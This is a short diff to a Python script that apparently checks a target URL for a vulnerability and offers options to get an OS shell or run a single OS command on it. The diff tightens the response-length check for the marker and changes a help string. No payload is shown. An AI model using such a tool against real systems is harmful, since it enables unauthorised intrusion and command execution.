@@ -50,7 +50,10 @@ def verity(url):
         s = requests.session()
         res = s.post(poc_url, timeout=4)
         if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
-            return True
+            if len(res.content) <40: # 34 length
+                return True
+            else:
+                return False
         else:
             return False
 
@@ -99,7 +102,7 @@ if __name__ == '__main__':
     parser.add_argument('-u', help='the target url.', required=True)
     parser.add_argument('-check', help='yes|no', required=False)
     parser.add_argument('-shell', help='get os shell (yes|no)', required=False)
-    parser.add_argument('-command', help='yes|no', required=False)
+    parser.add_argument('-command', help='one os command', required=False)
     args = parser.parse_args()
     args_dict = args.__dict__
 
